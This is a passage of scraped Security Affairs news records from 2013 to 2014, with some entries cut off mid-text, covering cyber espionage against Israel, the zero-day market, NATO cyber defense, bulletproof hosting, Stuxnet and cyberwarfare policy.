the cyberspace, and many political actors could be interested to fuel the crisis between the two populations. Anyway security experts recognized the same hand behind the latest attack originated from a server in the US, the tactics adopted by hackers is identical and there are many similarities in the code used.\n\nAccording Securlet,  the attackers have used \u201cXtreme RAT\u201c, back in November 2012 security experts from Norwegian antivirus and security firm Norman ASA  have discovered a cyber espionage campaign against Israeli institutions and law enforcement, forcing the government to shut down Internet access for its police and prohibiting the use of memory sticks and mobile storage to avoid the diffusion of the malicious agent.\n\nRaff declined to identify the other 14 systems that were compromised, Reuters reported that an anonymous Israeli source said these included companies involved in supplying Israeli defense infrastructure.\n\nIf the news is confirmed, it is very concerning, let\u2019s consider that the attack discovered could be just a first part of large operation that is targeting subcontractors to hit Israeli, it is very common that hackers target subcontractors to hit big enterprises and government offices due to the poor level of security they often offer.\n\nAviv Raff revealed that the 15 computers were controlled by the hackers for several days after the January 15, when the malicious email is sent with an attachment about ex- Israeli prime minister Ariel Sharon who had just died.\n\nThe cyber espionage campaign was driven by a spamming activity of malicious emails that claim to be sent Benny Gantz, Commander-in-Chief of the Israel Defense Forces, and reporting on the subject the news of an IDF strike against opponents in the Gaza Strip. The message text anticipates the content of the attached .zip file that claims to contain reports and photos of the attack. According Trend Micro firm the initial target of that attack was the Israeli Customs agency.\n\n\n\n \n\nIn fact the file attached to the email hides a known malware, the XtremeRat trojan, which was largely used in surveillance campaigns by many regimes such as Syrian government.  Xtreme Rat is a malware that belongs to the Remote Access Tool category really simple to retrieve online at a low price (Full version Price: \u20ac100 EUR). The malware is continuously improved, recent versions are Windows 8 compatible and have included the capabilities for audio and video capture and for password stealing from common browsers.\n\nSecurlert hasn\u2019t discovered what the hackers did after accessing to the system, it is not clear if the attackers have stolen some document or they have tried to manipulate some data.\n\n\u201cAll we know is at least one computer at the Civil Administration was in control of the attackers; what they did we don\u2019t know.\u201d said Raff said. \n\nThe incident is just the tip of the iceberg, has confirmed by media hacking activity in the Middle East is very intense, foreign governments and group of hacktivists like Anonymous have targeted the military, government offices, private companies and critical infrastructure.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Israeli Defense, hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/data-breach", "topic_name": "data breach"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gaza-strip", "topic_name": "Gaza Strip"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivists", "topic_name": "hacktivists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israeli-defense", "topic_name": "Israeli Defense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/middle-east", "topic_name": "Middle East"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/remote-access-tool", "topic_name": "Remote Access Tool"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/seculert", "topic_name": "Seculert"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spear-phishing", "topic_name": "spear phishing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/surveillence", "topic_name": "surveillence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/syrian-electronic-army", "topic_name": "Syrian Electronic Army"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/twitter", "topic_name": "Twitter"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/xtreme-rat", "topic_name": "Xtreme RAT"}]}, {"news_name": "Perception of cyberwarfare in US Defence and society", "news_link": "https://securityaffairs.co/wordpress/21077/cyber-warfare-2/perception-cyberwarfare-us.html", "title": "Perception of cyberwarfare in US Defence and society\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 11, 2014", "body": "In this post I desire to put together a series of useful information to better understand the perception of cyber threats on both US Government and population.\n\nCyberwarfare is considerable today one of the main concerns for the United States, outstripping even terrorism. According to defense, military, and national security leaders in a Defense News poll the risks of an imminent cyber attack with serious consequences for the population is high.\n\nDespite 32 percent of polled individuals believe that the government spends too much on defense, their concern for a cyber offensive is high, 45 percent of the 352 industry leaders polled revealed to consider the cyberwarfare is the gravest danger to the U.S.\n\nThe cyberspace is considered the fifth domain of warfare and investment since 2010, year of the foundation for the U.S. Cyber Command, have constantly increased.\n\nStuxnet has demonstrated how much danger coud be a cyber weapon, and has accelerated the army race and the improvement of cyber capabilities of almost every government.\n\n\n\nDespite the term cyberwarfare, cyberwar and Information Warfare are improperly used by security experts, they all represents the materialization of the nightmare of a conflict originated in the cyber space with direct consequences in the real world.\n\nA cyber attack could hit every sector of the US, from banking to defense, countries like Iran, North Korea, China and Russia could hit US networks with a cyber attack that could paralyze the nation.\n\n\n\nThat latter concern is that cyber war tactics might blur with traditional terrorism, a new wave of offensive could hit the US and its allies. Cyberwarfare is bringing fear in the American society, the prospect of cyberwarfare between world powers might be compared to a nuclear conflict. Cyber terrorism is reason of great concern for US Intelligence that consider confrontation between cyber power just a matter of cyber espionage in this day.\n\nSection 940 of the National Defense Authorization Act for Fiscal Year 2014, signed into law by President Obama recently, calls for \u201cControl of the Proliferation of Cyber Weapons\u201d to respond to to the increase of state-sponsored hacking and the design of new powerful and dangerous cyber weapons.\n\n\u201cThe President shall establish an interagency process to provide for the establishment of an integrated policy to control the proliferation of cyber weapons through unilateral and cooperative law enforcement activities, financial means, diplomatic engagement, and such other means as the President considers appropriate,\u201d the act declares. . . .\n\nThe bill establishes huge investment of hundreds of millions of dollars for the defense of the cyberspace for improvement of cyber capabilities, including high profile hacking training, analysis of overall cyber operations, an inventory of the military\u2019s existing cyber skill set and the creation of a new Principal Cyber Advisor to supervise the defense from cyber threats.\n\nThe key findings of the act are:\n\nNo doubts, the cybewarfare begin to frighten and influence more and more the way we live.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  cyberwarfare, US Government)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-terrorism", "topic_name": "cyber terrorism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us-government", "topic_name": "US Government"}]}, {"news_name": "CDM MAGAZINE \u2013 CYBER WARNINGS DECEMBER 2013 ED. for free", "news_link": "https://securityaffairs.co/wordpress/20854/cyber-crime/cdm-magazine-dec-2013.html", "title": "CDM MAGAZINE \u2013 CYBER WARNINGS DECEMBER 2013 ED. for free\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 31, 2013", "body": " \n\nSPONSORED BY RSA CONFERENCE 2014\n\n\n\nCYBER WARNINGS E-MAGAZINE:  DECEMBER 2013\n\nCYBER DEFENSE MAGAZINE: ANNUAL EDITION FOR 2013\n\nCYBER WARNINGS E-MAGAZINE: DECEMBER 2013\n\nCYBER DEFENSE MAGAZINE: ANNUAL EDITION FOR 2013\n\nCYBER WARNINGS E-MAGAZINE: DECEMBER 2013\n\nCYBER DEFENSE MAGAZINE:  ANNUAL EDITION FOR 2013\n\nWe hope you enjoy this month\u2019s edition\u2026\n\nSincerely,\n\nTEAM CDM\n\nCyber Defense Magazine\n\nP.S.

NATO is considered a privileged target for hackers, in 2012 it suffered  2,500 \u201csignificant cases\u201d of cyber attacks against its networks, during the 2013 the situation has remained almost unchanged but security experts believe that the number of sophisticated offensives is likely to increase.\n\nA NATO representative explained that the two cyber-defense teams are expected to operative in a few weeks in response to significant incidents ans cyber-attacks.\n\n\u201cExact 2013 figures have not yet been compiled. What we can see is that the incidents recorded by NATO experts so far this year are comparable to what similar organisations have faced and generally consistent with 2012 levels,\u201d said the NATO official.\n\nThe NATO cyber experts succeeded in the mitigation of the attacks avoiding serious damage to the infrastructure, let\u2019s remember that the organization invested nearly 58 million euro to upgrade the NATO Cyber Incident Response Centre (NCIRC).\n\nIn 2011 the NATO presented a Cyber Defence Policy that included the definition of a central structure responsible for the protection of all the structures of the alliance in case of cyber attacks. Below an abstract of the document:\n\n \n\n\n\nLast year Finmeccanica and Northrop Grumman were awarded a contract by the NATO Consultation, Command and Control (NATO C3) Agency for the development of the NATO Computer Incident Response Capability (NCIRC) \u2013 Full Operating Capability (FOC).\n\n\u201cThe contract, worth around EUR 50 million, is for an extensive managed service which will provide information assurance to around 50 NATO sites and headquarters throughout 28 countries worldwide. The NCIRC will provide the capability to detect and respond to cyber security threats and vulnerabilities rapidly and effectively. The project is intended to meet the level of ambition of NATO Head of States as set out during the Lisbon Summit in November 2010.\u201d reported AOS website.\n\nSince 2011 important steps forward have been done, earlier 2013 NATO defence ministers approved the first step of integrating cyber defence capability targets into the defence planning process requesting allies to set up a minimum set of cyber defence capabilities and preparedness. The NATO requested to the members of the Alliance to define a national cyber policy, a national cyber authority and the creation of national cyber defence response capabilities.\n\nThe NATO Cyber Incident Response Centre deployed advanced technologies including sensors, scanners and \u201cintelligent analytic capabilities\u201d to prevent, detect and respond to cyber threats.\n\nThe effort spent for the stablishment and the support of a response center is essential for the defense of critical network belonging to the organization. In the next years according the officials we will see a meaningful increase of detection and reaction capabilities of the Alliance, we must considere that the investments are part of the emprovement project begun in 2011 when the concepts of Information warfare and state sponsored hacking were not considered like today.\n\n\u201cThis upgrade will significantly enhance NATO\u2019s ability to protect its own networks. The NCIRC has proven to be a vital hub for dealing with cyber incidents and for disseminating cyber security information across the Alliance,\u201d the NATO official said.\n\nWe have to consider that the effor and the investment of the Alliance are a mandatory to responde a growing pressure of gangs of cyber criminals and hostile govenments.\n\nThe number of cyber attacks against critical infrastructures is increasing and according many cyber security expers it is question of time before a major incident could happen.\n\nThe offensives are even more sophisticated and it is necessary a joint effort to detect ongoing cyber threats and neutralize their effects, it\u2019s my opinion that this is a first step to win the challende of the next future \u2026 protect the cyberspace.\n\n\u201cLooking to 2014, we expect to see the operational benefits of the increased detection and response capability which we are currently achieving by upgrading the NCIRC. Our defensive efforts will focus on tuning our new system to maximum effect.\u201d stated the NATO official.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  NATO, cyber defense team)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-criminals", "topic_name": "cyber criminals"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-defense", "topic_name": "cyber defense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/finmeccanica", "topic_name": "Finmeccanica"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivists", "topic_name": "hacktivists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident-response", "topic_name": "incident response"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nato", "topic_name": "NATO"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nato-c3", "topic_name": "NATO C3"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/northrop-grumman", "topic_name": "Northrop Grumman"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-2", "topic_name": "security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-actors", "topic_name": "state sponsored actors"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "NSA \u2013 A bios malware can remotely destroy any US system", "news_link": "https://securityaffairs.co/wordpress/20529/cyber-crime/nsa-bios-malware.html", "title": "NSA \u2013 A bios malware can remotely destroy any US system\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 17, 2013", "body": "Senior National Security Agency (NSA) officials have revealed to CBS American television newsmagazine \u201c60 Minutes\u201d that a foreign government has tried to infect US systems with a BIOS-based malware that is able to destroy remotely any PC.\n\nThe program was attended by the NSA Director General Keith Alexander and the Information Assurance Director Debora Plunkett to comment on the revelation made by Snowden on the surveillance program.\n\n \n\n\n\nA foreign country developed BIOS malware disguised as a request for a software update that would have destroyed any PC.\n\n\u201cThis is the BIOS system which starts most computers.

The data center in Lebanon was built around two years ago meanwhile the one located in Syria was set up during the recent tumultuous time for the country.\n\nAccording to trusted intelligence sources of the company, new bulletproof hosting called \u201cWeb Host\u201d has organized own technical center for hosting illegal content and malicious software. The owners of new bad actors hosting choose an actual banner with a Beirut flag on it to be different from others, where they put also words about that they have own datacenter there.\n\n\n\n\n\nThe intelligence experts at IntelCrawler discovered that a Russian-speaking group is advertising the bulletproof hosting, the advertisement was found on a members-only forum called \u201cKorovka.name,\u201d.\n\n \n\n\n\n \n\n \u201cThe first datacenter appeared near 2 years ago and located in Lebanon. The new data center was built in Syria, right after the war, which made it a unique place for cybercrime business.\u201d   commented Dan Clements, IntelCrawler\u2019s President.\n\nOn the other side the owners of \u201cWebHost\u201d explained:\n\n \u201cWe have own support in datacenter, who has own ICQ and Jabber, that\u2019s why after buying dedicated server on our platform in Syria \u2013 you don\u2019t need standard support, you will have individual support\u00bb \u2013\n\n\nThey also provide various options, including the individual configuration of hardware on any dedicated servers, which can take from 2 to 5 days, and the opportunity of choosing and registering of own subnet of IP addresses.\n\nWhat did this location become so attractive for bad actors?\n\nThe answer is easy then you can imagine. First of all, because of very negative geopolitical relationships, both countries are still isolated from the EU and US in terms of any mutual cooperation, especially in telecommunications and security fields.\n\n\u201cThese countries have negative relations with Europe,\u201d \u201cThat\u2019s why it is a great platform for bulletproof hosting.\u201d said Andrey Komarov, IntelCrawler\u2019s CEO,.\n\nLaw enforcement, ISPs and private firms have improved their cooperation in the fight to the cybercrime, joint operations have been conducted against the crime online and principal governments are working to the definition of law framework dealing with Internet crime on a global scale.\n\nThe Budapest convention on cybercrime  \u201cis the first international treaty seeking to address Internet and computer crime by harmonizing national laws, improving investigative techniques, and increasing cooperation among nations\u201d but still many countries don\u2019t conform to it, those states are the heaven for cybercrime activities.\n\nSecondly, Syria is quite independent and not well developed in terms of the ISP business, prior to the Syrian civil war, telecommunications in Syria were slowly moving towards liberalization, with a number of licenses awarded and services launched in the Internet service provision market. Most forms of fixed-line communications are provided by the state owned operator, Syrian Telecom (Syriatel or STE).\n\nPreviously, some sorts of state sponsored malware and its C&C servers were already found in the subnets of STE, such as \u00abDarkcomet\u00bb in 2012. C&C was located on 216.6.0.28 IP address, which is belonged to Damascus STE.\n\nMentioned IP is belonged to AS6453, Owner \u2013 GLOBEINTERNET TATA Communications, one of the companies, which provides Syria external services, besides Turk Telecom (AS9121), Telecom Italia (AS6762) and PCCW Global (AS3491). According to these facts, the owners of new bulletproof hosting provider mentioned that their data center has wonderful direct connection with directly to Frankfurt from Tier-1 providers (Level3, GLBX, Tinet, Cogent), that\u2019s why there will be no additional hops on the line in order to avoid any delays, which makes it a unique place for telecommunication underground business.\n\n\u00abThere are not so many alternatives for those guys where to place servers for hosting, that\u2019s why their infrastructure could be located in one of STE data centers in several racks, which will be enough for hosting of quite big amount of illegal content from all over the world, firstly, related to malicious code\u00bb \u2013 said Andrey Komarov.\n\nOn the other side, \u201cWebHost\u201d mentioned that for different kinds of projects they can provide bulletproof hosting in more than 25 countries with prices from just 80 USD.\n\nProbably, we will see new bulletproof zones instead Taiwan, Romania, Indonesia, Latvia or other countries very soon, in face of Yemen, Egypt, Iraq, Iran.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Bulletproof hosting, Cybercrime)\n\n", "topics": ""}, {"news_name": "Zero-day vulnerability exploits, too precious commodities", "news_link": "https://securityaffairs.co/wordpress/20275/cyber-crime/nss-labs-zero-day-exploits.html", "title": "Zero-day vulnerability exploits, too precious commodities\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 8, 2013", "body": "Last week I discussed about the necessity to define a model for \u201ccyber conflict\u201d to qualify the principal issues related to the use of cyber tools and cyber weapons in an Information Warfare context, today I decided to give more info to the readers on cyber arsenals of governments. Governments consider the use of cyber weapons as a coadiuvant to conventional weapons, these malicious application could be used for sabotage or for cyber espionage, they could be used to hit a specifically designed software (e.g. SCADA within a critical infrastructure) or they could be used for large scale operations infecting thousand of machines exploiting zero-day in common application (e.g. Java platform, Adobe software).\n\n\n\nThe zero-day flaw are the most important component for the design of an efficient cyber weapon, governments have recently created dedicated cyber units to the discovery and exploitation of unknown vulnerabilities, but in many cases this precious knowledge is sold by private entities on the underground, consider that governments are primary buyers of the growing market of zero-day. But governments aren\u2019t unique buyers, exploit kits including zero-day are acquired also by  nongovernment actors buying, it has been estimated that the market is able to provide 85 exploits per day, a concerning number for the security industry.\n\n\n\nZero-day hunters are independent hackers but in the majority of cases are structured security firms that analyze every kind of software to discover flaws exploitable during a cyber attack and resell their knowledge to the highest bidder, no matter if it is a private company that will use it against a competitor of a foreign government.\n\nThe NSS Labs has recently issued an interesting study  study titled \u201cThe Known Unknowns\u201c, it reports that every day during a period of observation lasted three years, high-paying buyers have had access to at least 60 vulnerabilities targeting common software produced by Adobe, Apple, Microsoft and Oracle.\n\n\u201cNSS Labs has analyzed ten years of data from two major vulnerability purchase programs, and the results reveal that on any given day over the past three years, privileged groups have had access to at least 58 vulnerabilities targeting Microsoft, Apple, Oracle, or Adobe. Further, it has been found that these vulnerabilities remain private for an average of 151 days. These numbers are considered a minimum estimate of the \u201cknown unknowns\u201d, as it is unlikely that cyber criminals, brokers, or government agencies will ever share data about their operations.  \nSpecialized companies are offering zero-day vulnerabilities for subscription fees that are well within the budget of. A determined attacker (for example, 25 zero-days per year for USD $2.5 million); this has broken the monopoly that nation states historically have held regarding ownership of the latest cyber weapon technology. Jointly, half a dozen boutique exploit providers have the capacity to offer more than 100 exploits per year. \u201c\n\nIt has been estimated that every year zero-day hunters develope combined 100 exploits resulting in 85 privately known exploits at the ready on any particular day. Consider that this is a row estimation that not consider the data related to an independent group of hackers which activities are poorly known.\n\nOn the black market an exploit for a Windows OS sells for up to $250,000 according the BusinessWeek , a good incentive for hackers to focus their efforts in the discovery of zero-day.\n\nWhat is very concerning is that in many cases the entity that discovers the zero-day, to maximize the gains offers its knowledge to hostile governments, governments that use it also to persecute dissidents or to attack adversary states.\n\n\n\nThe zero-day market follows its own rules, the commodities are high deperible, the transactions are instantaneous and the agreement between buyers and sellers is very sensitive.\n\n\u201cAccording to a recent article in The\u201dNew\u201dYork\u201dTimes, firms such as VUPEN (France), ReVuln (Malta), Netragard, Endgame Systems, and Exodus Intelligence (US) advertise that they sell knowledge of security vulnerabilities for cyber espionage.

To explain the effect of acts of cyber war, security experts use to mention the cyber attack against the Estonia\u2019s government networks in 2007, an offense occurred in a period of intense political contrasts with Russia.\n\nBut the recent years have been characterized by an intense activity of governments in the cyberspace considered the fifth domain of the warfare, we assisted to the mutual network intrusions of Korean cyber armies the disputes between US and Israel against countries like China, Iran and Syria.\n\nAlmost every government in investing to improve its cyber capabilities, New Zeland and Russia for example have started important initiatives recently, the definition and the implementation of an efficient cyber strategy is a must for everyone. In many cases we discussed about the repercussions of a cyber attack on the reality, Stuxnet is a good example of the potential effect of a cyber weapon, a malicious code could in fact be used to harm an industrial process and cause loss of human life.\n\nThe absence of global accepted rules in the cyberspace, let\u2019s think the concept itself of cyber weapon is ambiguous, is causing a fragmentation of the power, information warfare is significantly influencing the defense strategies of every governments requesting a review of decisional processes.\n\nIt is mandatory to establish a global collaboration interstate to prevent the escalation of cyber conflicts, the cyber warfare scenario is rapidly evolving and governments must align their strategies working to the definition of a set of cyber rules globally recognized and accepted.\n\nEarly 2013 an International Group of Experts tried to define this set of rules, formalizing their effort in an handbook titled \u201cThe Tallinn Manual on the International Law Applicable to Cyber Warfare\u201d, a document that provides a study on how extant international law norms could be applied to cyber warfare.\n\n\n\nNATO Cooperative Cyber \u200b\u200bDefense Center of Excellence has sustained the drafting of the document to clarify the rules of the governments in the cyberspace, and their conduct, defining jurisdiction, control and legal responsibilities.\n\n\u00abA State bears international legal responsibility for cyber operation attributable to it and which constitutes a breach of an international obligation.\u00bb\n\nThe experts provided a legal definition for a concept such as a cyber attack and a cyber weapon, following an abstract from the first draft release:\n\n\u00abA cyber attack is cyber operation, whether offensive or defensive, that is reasonably expected to cause injury or death to persons or damage or destruction to objects\u00bb\n\nThe NATO group isn\u2019t the unique one,  the EastWest Institute has created the Cyber 40, with delegates from 40 digitally advanced countries, the purpose is to involve government organizations, industry groups and think tanks to define practical \u201chumanitarian agreements for cyber conflicts\u201d in cyber warfare.\n\nWithin principal goals the definition of  the duty of care in case of cyber attacks against a country that have to define which targets have to be preserved due the possible damage on the population. Dam, dykes and Nuclear Electrical Generating Stations could not represent a primary target for a cyber attack, another question is to operate in a \u201ccontext\u201d that needs to preserve children, journalists, medical and religious personnel. In cyber warfare, the context is fundamental to introduce the concept of cyber weapons, and experts have approached it defining the \u2018Means\u2019 of cyber warfare that are cyber weapons and their associated cyber systems.\n\n\u201cCyber weapons are cyber means of warfare that are by design, use, or intended use, capable of causing either injury to, or death of, persons. The \u2018Methods\u2019 of cyber warfare are the cyber tactics, techniques and procedures, by which hostilities are conducted.\u201d\n\nAs highlighted by many cyber experts it is necessary to contextualize the principles proposed by the Geneva and Hague conventions, to the information warfare facing with difficulties specific in the use of cyber tools.\n\nWhat could be considered an act of cyber war? Which are the rules of engages? When is a cyber attack justified? Which is the limitation of an \u201coffensive\u201d approach to cyber security?\n\nThese are just a few of questions to approach, it is necessary to define a \u201cmodel of cyber conflict\u201d, defining roles and responsibilities (e.g. Attackers, targets) .\n\nWithin the various urgencies there is the need to be able to distinguish humanitarian interests in cyberspace to avoid that a cyber attack could impact them, but it is a hard task.\n\nAnother serious issue to address is the attribution of responsibility for the cyber war acts, in the majority of cases it is quite impossible to discover the origin of the attack and to identify the attacker. The acceptance of a law framework could help to create a shared awareness of what is considerable \u201cmoral\u201d and what is not accepted.\n\nInformation warfare is conducted through the cyberspace but we must keep in mind the possible consequences on the real world, the human component must be always preserved also in a scenario in which machine component is assuming a crucial rule, let\u2019s think for example of the definition of a new generation of tools and systems able to take decision in real time in case of cyber attacks.\n\nCyber offensives are instantaneous events and in some cases to avoid the destruction of assets or to prevent the loss of human life it is necessary to take decisions in real time.\n\nAre we really able to substitute human intervention in critical situation evaluating every possible consequences real time? Are we able to design systems that could not be deceived and that will be able to take the right decision in a timely way?\n\nUntil we have defined a model for cyber conflict and the rules for the involved actors the answer is no!\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Cyber warfare, laws and regulations )\n\n \n\n", "topics": [{"topic_link":

After its disclosure it\u2019s risen the debate on the use of software and malicious application in Information warfare, every government is investing to improve its cyber capabilities working on both Defense and Offense sides.\n\nThe malware Stuxnet is widely considered to have been developed by the US Government in a joint work with Israel cyber units as a means to disrupt Iran\u2019s nuclear enrichment plans.\n\nWhen we discuss on Stuxnet, and more in general on the risks related to the uncontrolled diffusion of malicious agents in the cyberspace, we mentioned the possibility that a hostile entity, such as foreign government or a cyber criminal gang, could reverse engineer their source code to create more dangerous malware.\n\nIf the news is confirmed the news is very concerning, Stuxnet had infected the internal network of a Russian nuclear plant, exactly in the same way it compromised the control system in Iranian nuclear facilities in Natanz.\n\nEugene Kaspersky, CEO of Kasperky security firm revealed that a staffer at the unnamed nuclear Russian plant informed him of the infection.\n\n\u201c[The staffer said] their nuclear plant network which was disconnected from the internet \u2026 was badly infected by Stuxnet,\u201d\n\n\n\u201cSo unfortunately these people who were responsible for offensive technologies, they recognise cyber weapons as an opportunity.\u201d Kaspersky said.\n\n\n\n\nStuxnet, also in this case, infected the network within a Russian nuclear plant isolated from the Internet, to spread the malware attackers used as attack vector a USB device. Russian Intelligence agencies in the past have already observed this infection mode to cross a physically separated \u2018air-gapped\u2019 network, Russian astronauts for example had carried a virus on removable media to the International Space Station infecting machines there, according to Kaspersky.\n\n\n\nDuring a presentation given at the Canberra Press Club Kaspersky provided an excellent overview on the security of cyberspace, in particular highlighting the effect of activities of state-sponsored espionage and cybercrime.\n\n\u201cAll the data is stolen,\u201d \u201cAt least twice.\u201d is the emblematic statement pronounced by Kaspersky to describe a dramatic situation.\n\nKaspersky also focused the on the effort necessary to develop a state-sponsored malware such as Gauss, Flame and Red October , the cyber security expert revealed that for the design of a similar malicious code it is necessary at least a $10 million budged.\n\nKaspersky stated that more than 50% of malware were written in Chinese,  nearly 33% were written in Spanish or Portuguese, followed by Russian-coded malware, this last group is considerably very dangerous because the malicious code it products is the most sophisticated in the world.\n\nKaspersky also added that Chinese malware appeared to \u2018not care\u2019 about operational security because security experts during the investigation have regularly found personal document, photos and social networking accounts on servers used in attack campaigns.\n\nCyberspace is becoming a dangerous space that we cannot do without!\n\nPierluigi Paganini\n\n(Security Affairs \u2013 cyber weapon, Stuxnet)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-capabilities", "topic_name": "cyber capabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gauss", "topic_name": "Gauss"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kaspersky", "topic_name": "Kaspersky"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/red-october", "topic_name": "Red October"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}]}, {"news_name": "Israel \u2013 AP Exclusive reveals tunnel hit by cyber attack", "news_link": "https://securityaffairs.co/wordpress/19158/cyber-crime/israel-tunnel-cyber-attack.html", "title": "Israel \u2013 AP Exclusive reveals tunnel hit by cyber attack\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 28, 2013", "body": "Israel is considered one of the most advanced country in cyber security, but at the same time is a privileged target for hostile governments intent in sabotage and cyber espionage on his technology.\n\nIsreal military officials are aware of cyber threats that could hit the infrastructure of the country and they afraid the possible effect of a cyber attack on a large scale. Israeli government websites suffer thousands of cyberattacks each day according Ofir Ben Avi, head of the government\u2019s website division. The Israel Electric Corp. confirmed that its servers register about 6,000 unique computer attacks every second.\n\nIn June, Prime Minister Benjamin Netanyahu stated that Iran militia, Hezbollah and Hamas have targeted in numerous occasions Israel\u2019s \u201cessential systems,\u201d including its water facilities, electric grid, trains and banks.\n\n\u201cEvery sphere of civilian economic life, let\u2019s not even talk about our security, is a potential or actual cyberattack target,\u201d said Netanyahu.\n\nIsrael\u2019s military chief Lt. Gen. Benny Gantz made a high-profile speech recently outlining that within the greatest threats his country might face in the future there is the computer sabotage as a top concern. A sophisticated cyber attack could be used to shut down a banking system of Israel, the national electric grids or a defense system, this is a nightmare for the Defense.\n\nCybersecurity experts revealed to The Associated Press that a major artery in Israel\u2019s national road network located in the northern the city of Haifa suffered a cyber attack that has caused serious logistical problems and hundreds of thousands of dollars in damage.\n\nThe tunnel is a strategic thoroughfare in the third largest city of the country, and as a demonstration of its importance in the city is exploring the possibility to use the structure as a public shelter in case of emergency.\n\nIt seems that the attackers used a malware to hit the security camera apparatus in the Carmel Tunnel toll road in Sept. 8 and to gain its control.\n\n\u201cThe attack caused an immediate 20-minute lockdown of the roadway. The next day, the expert said, it shut down the roadway again during morning rush hour. It remained shut for eight hours, causing massive congestion.\u201d\n\n\n\nThe experts that have investigated on the incident exclude that the hypothesis of a state-sponsored attack because the malicious code used  was not sophisticated enough to be the work of a hostile government, it is likely the involvement of a group of hacktivists.\n\nCarmelton company that oversees the toll road, blamed a \u201ccommunication glitch\u201d for the incident, while Oren David, a manager at security firm RSA\u2019s anti-fraud unit, said that although he didn\u2019t have information about the tunnel incident similar attacks could represent a serious menace for population.\n\n\u201cMost of these systems are automated, especially as far as security is concerned. They\u2019re automated and they\u2019re remotely controlled, either over the Internet or otherwise, so they\u2019re vulnerable to cyberattack,\u201d \u201camong the top-targeted countries.\u201d said David.\n\nIn reality Iranian hackers and other hostile entities have penetrated successfully Israeli systems, Israel has controlled the attacks to track back the hackers, profile their methods of attack and to conduct a disinformation campaign making available false information.\n\nTo improve security of critical infrastructure the Israeli civilian infrastructure, Israel\u2019s national electric company has recently launched a training program, jointly with cyber defense company CyberGym, to teach engineers and managers of critical plants to detect ongoing cyber attacks.\n\nThe attack scenario revealed portends to an escalation of attacks by hostile entities, whether they are cyber criminals, hacktivits or 